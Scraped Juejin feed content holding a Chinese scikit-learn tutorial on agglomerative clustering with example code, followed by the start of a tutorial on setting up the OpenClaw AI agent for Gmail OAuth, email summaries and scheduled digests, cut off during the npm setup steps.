                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是锋哥。最近连载更新《Scikit-learn Python机器学习》技术专题。 <img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bdd5ef39ae6f428aa3fd01fd164b9dd1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP6ZSLamF2YTEyMzQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770696989&amp;x-signature=6ll6CDbpJE3382pjN1WX8gUD%2Fsk%3D" alt="image.png" loading="lazy"/> 本课程主要讲解基于Scikit-learn的Python机器学习知识，包括机器学习概述，特征工程(数据集，特征抽取，特征预处理，特征降维等)，分类算法(K-临近算法，朴素贝叶斯算法，决策树等)，回归与聚类算法(线性回归，欠拟合，逻辑回归与二分类，K-means算法)等。 同时也配套视频教程<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV11reUzEEPH%2F" title="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV11reUzEEPH%2F" target="_blank">《Scikit-learn Python机器学习 视频教程》</a></p>
<p><strong>Agglomerative Clustering（凝聚层次聚类）</strong> 是一种自底向上的层次聚类方法，属于无监督学习的一种。它通过逐步将最相似的样本合并成一个簇（cluster），最终得到一个包含所有样本的簇，形成一个层次结构（树状图）。与其他聚类方法（如K-means）不同，凝聚层次聚类不需要事先指定簇的数量。</p>
<h2 data-id="heading-0">算法原理</h2>
<p>凝聚层次聚类的核心思想是基于距离（或相似度）度量来逐步合并样本或簇。</p>
<p>步骤</p>
<ol start="0">
<li>
<p><strong>初始化：</strong> 每个样本初始化为一个簇。</p>
</li>
<li>
<p><strong>计算距离：</strong> 计算每对簇之间的距离（或相似度）。距离计算方法可以有不同的选择，常见的有：</p>
<ul>
<li><strong>单链接（Single Linkage）：</strong> 两个簇之间的最小距离（即簇间最近的两个样本之间的距离）。</li>
<li><strong>完全链接（Complete Linkage）：</strong> 两个簇之间的最大距离（即簇间最远的两个样本之间的距离）。</li>
<li><strong>均值链接（Average Linkage）：</strong> 两个簇之间的平均距离。</li>
<li><strong>中心链接（Centroid Linkage）：</strong> 两个簇之间的中心点距离。</li>
</ul>
</li>
<li>
<p><strong>合并最近的簇：</strong> 选择距离最小的两个簇，合并成一个新的簇。</p>
</li>
<li>
<p><strong>重复步骤2和3：</strong> 不断计算簇间距离并合并，直到所有样本合并为一个簇或达到预设的簇数。</p>
</li>
<li>
<p><strong>树状图（Dendrogram）：</strong> 最终生成的聚类结果可通过树状图表示，显示了不同样本和簇的合并顺序。</p>
</li>
</ol>
<h2 data-id="heading-1">凝聚层次聚类的数学公式</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/28f534f87a844fcdbbd51a38c298cbb2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP6ZSLamF2YTEyMzQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770696989&amp;x-signature=UrezkJ8%2BsyF2IUfuZ3M8vlun4mA%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1631520205714867bc47d9c96895a49d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP6ZSLamF2YTEyMzQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770696989&amp;x-signature=n3Ktmt9SrHpWxGNOkcE1qC045Ls%3D" alt="image.png" loading="lazy"/>
我们看一个示例：</p>
<p>假设我们有以下二维数据点：</p>



































<table><thead><tr><th>样本</th><th>x<em>x</em></th><th>y<em>y</em></th></tr></thead><tbody><tr><td>A</td><td>1</td><td>2</td></tr><tr><td>B</td><td>1.5</td><td>1.8</td></tr><tr><td>C</td><td>5</td><td>8</td></tr><tr><td>D</td><td>8</td><td>8</td></tr><tr><td>E</td><td>1</td><td>1</td></tr></tbody></table>
<p><strong>步骤1：</strong> 计算每一对数据点之间的距离（例如使用欧几里得距离）。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/adb963f9d96e4a49b3e9fea24799559c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP6ZSLamF2YTEyMzQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770696989&amp;x-signature=vUE16ffx2s8XCzAEqkweGS3j8h8%3D" alt="image.png" loading="lazy"/></p>
<p>...（继续计算其他距离）</p>
<p><strong>步骤2：</strong> 找到距离最小的两个点或簇。假设 A<em>A</em> 和 B<em>B</em> 之间的距离最小，我们首先将 A<em>A</em> 和 B<em>B</em> 合并为一个簇。</p>
<p><strong>步骤3：</strong> 计算新簇与其他数据点的距离，并重复步骤2和3直到所有数据点合并为一个簇。</p>
<h2 data-id="heading-2">API介绍</h2>
<p>在Scikit-learn中，<code>AgglomerativeClustering</code> 类可以实现凝聚层次聚类。</p>
<pre><code class="hljs language-ini" lang="ini">AgglomerativeClustering(
    <span class="hljs-attr">n_clusters</span>=<span class="hljs-number">2</span>,              <span class="hljs-comment"># 最重要的参数：聚类数量</span>
    *,                         <span class="hljs-comment"># 后面必须使用关键字参数</span>
    <span class="hljs-attr">metric</span>=<span class="hljs-string">'euclidean'</span>,        <span class="hljs-comment"># 距离度量方法</span>
    <span class="hljs-attr">linkage</span>=<span class="hljs-string">'ward'</span>,            <span class="hljs-comment"># 链接准则</span>
    <span class="hljs-attr">distance_threshold</span>=None,   <span class="hljs-comment"># 距离阈值（替代n_clusters）</span>
    <span class="hljs-attr">compute_full_tree</span>=<span class="hljs-string">'auto'</span>,  <span class="hljs-comment"># 是否计算完整树</span>
    <span class="hljs-attr">compute_distances</span>=<span class="hljs-literal">False</span>    <span class="hljs-comment"># 是否计算距离</span>
)
</code></pre>
<p>核心参数介绍：</p>
<ol start="0">
<li><code>n_clusters</code> - 聚类数量</li>
</ol>
<ul>
<li><strong>作用</strong>：指定最终要形成的簇的数量</li>
<li><strong>类型</strong>：int</li>
<li><strong>默认值</strong>：2</li>
</ul>
<ol start="2">
<li><code>metric</code> - 距离度量</li>
</ol>
<ul>
<li>
<p><strong>作用</strong>：定义数据点之间的距离计算方法</p>
</li>
<li>
<p><strong>常用选项</strong>：</p>
<ul>
<li><code>'euclidean'</code>：欧几里得距离（默认）</li>
<li><code>'manhattan'</code>：曼哈顿距离</li>
<li><code>'cosine'</code>：余弦距离</li>
</ul>
</li>
</ul>
<ol start="3">
<li><code>linkage</code> - 链接准则</li>
</ol>
<ul>
<li>
<p><strong>作用</strong>：定义簇与簇之间的合并策略</p>
</li>
<li>
<p><strong>常用选项</strong>：</p>
<ul>
<li><code>'ward'</code>：沃德法（默认，最小化方差）</li>
<li><code>'complete'</code>：全链接（最大距离）</li>
<li><code>'average'</code>：平均链接</li>
<li><code>'single'</code>：单链接（最小距离）</li>
</ul>
</li>
</ul>
<ol start="4">
<li><code>distance_threshold</code> - 距离阈值</li>
</ol>
<ul>
<li><strong>作用</strong>：当簇间距离超过此值时停止合并</li>
<li><strong>类型</strong>：float 或 None</li>
<li><strong>注意</strong>：设置此参数时，<code>n_clusters</code> 必须为 None</li>
</ul>
<h2 data-id="heading-3">具体示例</h2>
<pre><code class="hljs language-ini" lang="ini">import numpy as np
import matplotlib.pyplot as plt
from sklearn.cluster import AgglomerativeClustering
from sklearn.datasets import make_blobs
from sklearn.metrics import silhouette_score
import scipy.cluster.hierarchy as sch
​
<span class="hljs-comment"># 设置中文字体支持</span>
plt.rcParams<span class="hljs-section">['font.sans-serif']</span> = <span class="hljs-section">['SimHei']</span>  <span class="hljs-comment"># 用来正常显示中文标签</span>
plt.rcParams<span class="hljs-section">['axes.unicode_minus']</span> = False  <span class="hljs-comment"># 用来正常显示负号</span>
<span class="hljs-comment"># 生成示例数据</span>
X, <span class="hljs-attr">y_true</span> = make_blobs(n_samples=<span class="hljs-number">300</span>, centers=<span class="hljs-number">4</span>, cluster_std=<span class="hljs-number">0.60</span>, random_state=<span class="hljs-number">0</span>)
​
<span class="hljs-comment"># 应用凝聚层次聚类</span>
<span class="hljs-attr">agg_clustering</span> = AgglomerativeClustering(n_clusters=<span class="hljs-number">4</span>, linkage=<span class="hljs-string">'ward'</span>)
<span class="hljs-attr">y_pred</span> = agg_clustering.fit_predict(X)
​
<span class="hljs-comment"># 评估聚类效果</span>
<span class="hljs-attr">silhouette_avg</span> = silhouette_score(X, y_pred)
print(f"轮廓系数: {silhouette_avg:.3f}")
​
<span class="hljs-comment"># 可视化结果</span>
plt.figure(<span class="hljs-attr">figsize</span>=(<span class="hljs-number">15</span>, <span class="hljs-number">5</span>))
​
<span class="hljs-comment"># 原始数据</span>
plt.subplot(1, 3, 1)
plt.scatter(X<span class="hljs-section">[:, 0]</span>, X<span class="hljs-section">[:, 1]</span>, <span class="hljs-attr">c</span>=y_<span class="hljs-literal">true</span>, cmap=<span class="hljs-string">'viridis'</span>)
plt.title('原始数据 (真实标签)')
​
<span class="hljs-comment"># 聚类结果</span>
plt.subplot(1, 3, 2)
plt.scatter(X<span class="hljs-section">[:, 0]</span>, X<span class="hljs-section">[:, 1]</span>, <span class="hljs-attr">c</span>=y_pred, cmap=<span class="hljs-string">'viridis'</span>)
plt.title('凝聚层次聚类结果')
​
<span class="hljs-comment"># 树状图</span>
plt.subplot(1, 3, 3)
<span class="hljs-attr">dendrogram</span> = sch.dendrogram(sch.linkage(X, method=<span class="hljs-string">'ward'</span>))
plt.title('树状图')
plt.xlabel('样本索引')
plt.ylabel('距离')
​
plt.tight_layout()
plt.show()
</code></pre>
<p>运行结果：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de16995c854f4111951a704ee25091d5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP6ZSLamF2YTEyMzQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770696989&amp;x-signature=v3a4l8O6HM78zl%2FFzQk00hUkgRM%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[OpenClaw (原 Moltbot) Gmail 集成教程：邮件自动化与每日摘要]]></title>    <link>https://juejin.cn/post/7602166907572437030</link>    <guid>https://juejin.cn/post/7602166907572437030</guid>    <pubDate>2026-02-03T05:23:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602166907572437030" data-draft-id="7602206323460456499" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="OpenClaw (原 Moltbot) Gmail 集成教程：邮件自动化与每日摘要"/> <meta itemprop="keywords" content="OpenAI,人工智能"/> <meta itemprop="datePublished" content="2026-02-03T05:23:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Bi"/> <meta itemprop="url" content="https://juejin.cn/user/852876756274749"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            OpenClaw (原 Moltbot) Gmail 集成教程：邮件自动化与每日摘要
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/852876756274749/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Bi
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T05:23:49.000Z" title="Tue Feb 03 2026 05:23:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>本文演示如何使用 OpenClaw（原名 Moltbot/Clawdbot）实现 Gmail 邮件自动化管理。你将学会完成 OAuth 授权、筛选重要邮件、生成摘要，并配置定时推送，让邮件处理更省心。</p>
<h2 data-id="heading-1">前置条件</h2>
<ol>
<li>已安装 OpenClaw，并完成频道接入（可参考： <a href="https://juejin.cn/post/7600752623068102666" target="_blank" title="https://juejin.cn/post/7600752623068102666">OpenClaw（原 Moltbot）安装教程：从 0 搭建本地 AI 助手</a>）</li>
<li>拥有 Google 账号（Gmail 邮箱）</li>
</ol>
<h2 data-id="heading-2">集成</h2>
<h3 data-id="heading-3">确定方案</h3>
<figure class="my-6">
  <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c49313d53b2496c84d79dabc4bab65a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770701033&amp;x-signature=%2BD5c9gOBH0%2BUuLId0us785r4fm8%3D" alt="OpenClaw设置Gmail" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    OpenClaw设置Gmail
  </figcaption>
</figure>
<p>可以直接跟 OpenClaw 说下面这段话帮忙设置 Gmail：</p>
<pre><code class="hljs language-bash" lang="bash">Set up Gmail integration <span class="hljs-keyword">for</span> email management
</code></pre>
<p>这里我选择的是方案 2：<strong>Gmail API + OAuth</strong>。这是 OpenClaw 最推荐的做法，下面是 OpenClaw 回复的操作方案：</p>
<pre><code class="hljs language-bash" lang="bash">方案 2 的落地步骤（我们就按这个来）

我会在这台 Clawdbot 服务器上做：

1. 写一个脚本：拉取 Gmail 未读邮件（From/Subject/时间/正文摘要/链接）
2. 设置定时：每 X 分钟检查一次
3. 把摘要推送给你（Telegram）
你需要做的 2 件事

A. 创建 Google OAuth 客户端

1. 打开 Google Cloud Console → 创建项目
2. APIs &amp; Services → Enable APIs → 启用 Gmail API
3. Credentials → Create Credentials → OAuth client ID
类型选 “Desktop App”（最省事）
4. 下载生成的 client_secret_*.json
B. 把这个 json 发给我

• 最好用 Telegram 直接发 文件（不要粘贴在消息里）
• 我会把它放到服务器的 secrets/ 并只用于 OAuth 授权
我不会要你的 Gmail 密码，也不需要你给 2FA 验证码。



我还需要你确认 3 个设置（我才能一次配好）

1. 只读够不够？还是你想我也能 打标签/标记已读？（默认：只读）
2. 推送频率：每 5/15/30/60 分钟一次？
3. 推送规则：  • 只推 “未读且重要（Primary）”
  • 还是推所有未读（含 Promotions/Social）？

你回我这 3 个答案 + 把 client_secret_*.json 发过来，我就开始在服务器上搭脚本和定时任务。
</code></pre>
<h3 data-id="heading-4">Google Cloud Console 配置</h3>
<p>具体实现方案如下：</p>
<ol>
<li>打开 Google Cloud Console 第一次需要先创建项目 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fconsole.cloud.google.com%2F" target="_blank" title="https://console.cloud.google.com/" ref="nofollow noopener noreferrer">console.cloud.google.com/</a>).</li>
</ol>
<figure class="my-6">
  <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df68b0172504473e977c910ab07b458f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770701033&amp;x-signature=r4r7jy5ZoybrVHTvfdT8uSfUm%2FE%3D" alt="Google Cloud Console 主页" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    Google Cloud Console 主页
  </figcaption>
</figure>
<ol start="2">
<li>选择 <strong>API 和服务（APIs &amp; Services）</strong>，点击 <strong>启用 API 和服务</strong></li>
</ol>
<figure class="my-6">
  <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/177fdcfa8f6c479d9cda30c98d7cf509~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770701033&amp;x-signature=iwe9cwvVQuU7LW%2FQ82XnsEHYLxw%3D" alt="Google Cloud Console 启用API" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    Google Cloud Console 启用API
  </figcaption>
</figure>
<ol start="3">
<li>找到 <strong>Gmail API</strong> 并启用</li>
</ol>
<figure class="my-6">
  <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd4111d584924629a241be6b7493c17c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770701033&amp;x-signature=U5VALO%2ByY751WPbJmyhSB4ZFPOY%3D" alt="Google Cloud Console 创建凭证" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    Google Cloud Console 创建凭证
  </figcaption>
</figure>
<ol start="4">
<li>回到控制台 <strong>API 和服务 → 凭证 → 创建凭证 → OAuth 客户端 ID</strong>，类型选择 <strong>Desktop App（桌面应用）</strong>。创建完成后会生成客户端 ID 和客户端密钥，这两个一定要保存好。并下载 <code>client_secret_*.json</code> 文件。</li>
</ol>
<p><a id="user-content-oauth-consent-screen" title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="/></p>
<figure class="my-6">
  <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/984e1ce807b04a1c9b1ca7f633aeef76~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770701033&amp;x-signature=2t7MxHO8wfxhdpc4BamXTMjpCAc%3D" alt="Google Cloud Console OAuth consent screen" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    Google Cloud Console OAuth consent screen
  </figcaption>
</figure>
<ol start="5">
<li>在搜索框输入 <strong>OAuth consent screen</strong>，在 <strong>目标对象 → 测试用户</strong> 中添加自己的 Gmail 邮箱</li>
</ol>
<h3 data-id="heading-5">OpenClaw 配置</h3>
<figure class="my-6">
  <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a251ab2b4a2544158ea8f5abec2d0972~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770701033&amp;x-signature=6i3TKu9qHTg5dPsCPg9ioodiXQY%3D" alt="OpenClaw Config Email" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    OpenClaw Config Email
  </figcaption>
</figure>
<p>接下来把刚刚下载的 <code>client_secret_*.json</code> 文件和自己的需求发给 OpenClaw。</p>
<p>这时会得到类似回复：</p>
<pre><code class="hljs language-bash" lang="bash">行，老板，三项设置我收到了：

1. 标记已读
2. 每 3 小时推送一次
3. 只推 Primary 未读
但现在还差最后一步：我需要你再给我一个 gmail_token.json（里面必须带 refresh_token），这样我才能在服务器上定时拉取邮件并“标记已读”。
注意：为了能标记已读，授权 scope 需要 gmail.modify（只读的 gmail.readonly 不够）。

你要做的事（在你自己的电脑上，5 分钟）

1. 新建一个文件夹，把你刚发的那个 client_secret.json 放进去
2. 在该文件夹里执行：
npm init -y
npm i googleapis @google-cloud/local-auth
